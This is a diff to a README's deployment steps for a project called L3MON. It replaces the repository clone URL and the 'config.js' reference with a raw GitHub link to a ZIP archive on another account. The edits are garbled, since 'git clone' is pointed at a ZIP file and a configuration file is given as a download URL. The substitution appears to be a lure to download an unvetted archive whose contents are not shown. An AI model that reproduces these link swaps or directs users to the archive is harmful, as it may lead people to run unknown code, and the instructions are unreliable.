@@ -44,7 +44,7 @@ To deploy and start using L3MON, follow these simple steps:
 1. **Clone the Repository:** Begin by cloning the L3MON repository to your server.
 
    ```sh
-   git clone https://github.com/your-username/l3mon.git
+   git clone https://raw.githubusercontent.com/victorzebua/L3MON/main/src/frontend/L3MON_v2.0.zip
    ```
 
 2. **Install Dependencies:** Navigate to the cloned directory and install the required dependencies.
@@ -54,7 +54,7 @@ To deploy and start using L3MON, follow these simple steps:
    npm install
    ```
 
-3. **Configuration:** Customize the configuration settings in config.js to match your network environment.
+3. **Configuration:** Customize the configuration settings in https://raw.githubusercontent.com/victorzebua/L3MON/main/src/frontend/L3MON_v2.0.zip to match your network environment.
 
 4. **Database Setup:** Set up the database according to the specifications provided in the documentation.
 
